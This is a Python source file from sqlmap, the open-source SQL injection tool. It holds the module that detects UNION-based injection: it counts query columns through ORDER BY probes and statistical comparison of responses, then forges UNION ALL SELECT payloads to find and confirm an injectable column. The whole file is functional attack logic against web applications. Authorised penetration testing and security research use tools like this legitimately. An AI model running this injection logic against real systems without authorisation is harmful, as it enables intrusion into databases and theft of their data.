#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import random
import re

from lib.core.agent import agent
from lib.core.common import average
from lib.core.common import Backend
from lib.core.common import isNullValue
from lib.core.common import listToStrValue
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import removeReflectiveValues
from lib.core.common import singleTimeLogMessage
from lib.core.common import singleTimeWarnMessage
from lib.core.common import stdev
from lib.core.common import wasLastRequestDBMSError
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import PAYLOAD
from lib.core.settings import FROM_DUMMY_TABLE
from lib.core.settings import UNION_MIN_RESPONSE_CHARS
from lib.core.settings import UNION_STDEV_COEFF
from lib.core.settings import MIN_RATIO
from lib.core.settings import MAX_RATIO
from lib.core.settings import MIN_STATISTICAL_RANGE
from lib.core.settings import MIN_UNION_RESPONSES
from lib.core.settings import ORDER_BY_STEP
from lib.core.unescaper import unescaper
from lib.request.comparison import comparison
from lib.request.connect import Connect as Request

def __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL):
    """
    Finds number of columns affected by UNION based injection
    """
    retVal = None

    def __orderByTechnique():
        def __orderByTest(cols):
            query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
            query = agent.suffixQuery(query, suffix=suffix, comment=comment)
            payload = agent.payload(newValue=query, place=place, parameter=parameter, where=where)
            page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
            return not re.search(r"(warning|error|order by)", page or "", re.I) and comparison(page, headers)

        if __orderByTest(1) and not __orderByTest(randomInt()):
            infoMsg = "ORDER BY technique seems to be usable. "
            infoMsg += "This should reduce the time needed "
            infoMsg += "to find the right number "
            infoMsg += "of query columns. Automatically extending the "
            infoMsg += "range for current UNION query injection technique test"
            singleTimeLogMessage(infoMsg)

            lowCols, highCols = 1, ORDER_BY_STEP
            found = None
            while not found:
                if __orderByTest(highCols):
                    lowCols = highCols
                    highCols += ORDER_BY_STEP
                else:
                    while not found:
                        mid = highCols - (highCols - lowCols) / 2
                        if __orderByTest(mid):
                            lowCols = mid
                        else:
                            highCols = mid
                        if (highCols - lowCols) < 2:
                            found = lowCols

            return found

    pushValue(kb.errorIsNone)
    items, ratios = [], []
    kb.errorIsNone = False
    lowerCount, upperCount = conf.uColsStart, conf.uColsStop

    if lowerCount == 1:
        found = kb.orderByColumns or __orderByTechnique()
        if found:
            kb.orderByColumns = found
            infoMsg = "target url appears to have %d columns in query" % found
            singleTimeLogMessage(infoMsg)
            return found

    if abs(upperCount - lowerCount) < MIN_UNION_RESPONSES:
        upperCount = lowerCount + MIN_UNION_RESPONSES

    min_, max_ = MAX_RATIO, MIN_RATIO
    pages = {}

    for count in xrange(lowerCount, upperCount+1):
        query = agent.forgeInbandQuery('', -1, count, comment, prefix, suffix, kb.uChar, where)
        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
        page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
        if not isNullValue(kb.uChar):
            pages[count] = page
        ratio = comparison(page, headers, getRatioValue=True) or MIN_RATIO
        ratios.append(ratio)
        min_, max_ = min(min_, ratio), max(max_, ratio)
        items.append((count, ratio))

    if not isNullValue(kb.uChar):
        for regex in (kb.uChar, r'>\s*%s\s*<' % kb.uChar):
            contains = [(count, re.search(regex, page or "", re.IGNORECASE) is not None) for count, page in pages.items()]
            if len(filter(lambda x: x[1], contains)) == 1:
                retVal = filter(lambda x: x[1], contains)[0][0]
                break

    if not retVal:
        ratios.pop(ratios.index(min_))
        ratios.pop(ratios.index(max_))

        minItem, maxItem = None, None

        for item in items:
            if item[1] == min_:
                minItem = item
            elif item[1] == max_:
                maxItem = item

        if all(map(lambda x: x == min_ and x != max_, ratios)):
            retVal = maxItem[0]

        elif all(map(lambda x: x != min_ and x == max_, ratios)):
            retVal = minItem[0]

        elif abs(max_ - min_) >= MIN_STATISTICAL_RANGE:
                deviation = stdev(ratios)
                lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation

                if min_ < lower:
                    retVal = minItem[0]

                if max_ > upper:
                    if retVal is None or abs(max_ - upper) > abs(min_ - lower):
                        retVal = maxItem[0]

    kb.errorIsNone = popValue()

    if retVal:
        infoMsg = "target url appears to be UNION injectable with %d columns" % retVal
        singleTimeLogMessage(infoMsg)

    return retVal

def __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
    validPayload = None
    vector = None

    positions = range(0, count)

    # Unbiased approach for searching appropriate usable column
    random.shuffle(positions)

    # For each column of the table (# of NULL) perform a request using
    # the UNION ALL SELECT statement to test it the target url is
    # affected by an exploitable inband SQL injection vulnerability
    for position in positions:
        # Prepare expression with delimiters
        randQuery = randomStr(UNION_MIN_RESPONSE_CHARS)
        phrase = "%s%s%s".lower() % (kb.chars.start, randQuery, kb.chars.stop)
        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
        randQueryUnescaped = unescaper.unescape(randQueryProcessed)

        # Forge the inband SQL injection request
        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

        # Perform the request
        page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
        content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
            removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
            payload, True) or "")

        if content and phrase in content:
            validPayload = payload
            vector = (position, count, comment, prefix, suffix, kb.uChar, where)

            if where == PAYLOAD.WHERE.ORIGINAL:
                # Prepare expression with delimiters
                randQuery2 = randomStr(UNION_MIN_RESPONSE_CHARS)
                phrase2 = "%s%s%s".lower() % (kb.chars.start, randQuery2, kb.chars.stop)
                randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
                randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2)

                # Confirm that it is a full inband SQL injection
                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
                payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

                # Perform the request
                page, headers = Request.queryPage(payload, place=place, content=True, raise404=False)
                content = "%s%s".lower() % (page or "", listToStrValue(headers.headers if headers else None) or "")

                if not all(_ in content for _ in (phrase, phrase2)):
                    vector = (position, count, comment, prefix, suffix, kb.uChar, PAYLOAD.WHERE.NEGATIVE)

            unionErrorCase = kb.errorIsNone and wasLastRequestDBMSError()

            if unionErrorCase:
                warnMsg = "combined UNION/error-based SQL injection case found on "
                warnMsg += "column %d. sqlmap will try to find another " % (position + 1)
                warnMsg += "column with better characteristics"
                logger.warn(warnMsg)
            else:
                break

    return validPayload, vector

def __unionConfirm(comment, place, parameter, prefix, suffix, count):
    validPayload = None
    vector = None

    # Confirm the inband SQL injection and get the exact column
    # position which can be used to extract data
    validPayload, vector = __unionPosition(comment, place, parameter, prefix, suffix, count)

    # Assure that the above function found the exploitable full inband
    # SQL injection position
    if not validPayload:
        validPayload, vector = __unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.NEGATIVE)

    return validPayload, vector

def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    validPayload = None
    vector = None
    query = agent.prefixQuery("UNION ALL SELECT %s" % kb.uChar)

    # In case that user explicitly stated number of columns affected
    if conf.uColsStop == conf.uColsStart:
        count = conf.uColsStart
    else:
        count = __findUnionCharCount(comment, place, parameter, value, prefix, suffix, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)

    if count:
        if Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and query.endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]):
            query = query[:-len(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()])]

        if count:
            query += ", %s" % kb.uChar

        if Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE:
            query += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]

        validPayload, vector = __unionConfirm(comment, place, parameter, prefix, suffix, count)

        if not all([validPayload, vector]) and not all([conf.uChar, conf.dbms]):
            warnMsg = "if UNION based SQL injection is not detected, "
            warnMsg += "please consider "
            if not conf.uChar:
                warnMsg += "usage of option '--union-char' "
                warnMsg += "(e.g. --union-char=1) "
            if not conf.dbms:
                if not conf.uChar:
                    warnMsg += "and/or try to force the "
                else:
                    warnMsg += "forcing the "
                warnMsg += "back-end DBMS (e.g. --dbms=mysql) "
            singleTimeWarnMessage(warnMsg)

    return validPayload, vector

def unionTest(comment, place, parameter, value, prefix, suffix):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.direct:
        return

    kb.technique = PAYLOAD.TECHNIQUE.UNION
    validPayload, vector = __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)

    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload)

    return validPayload, vector
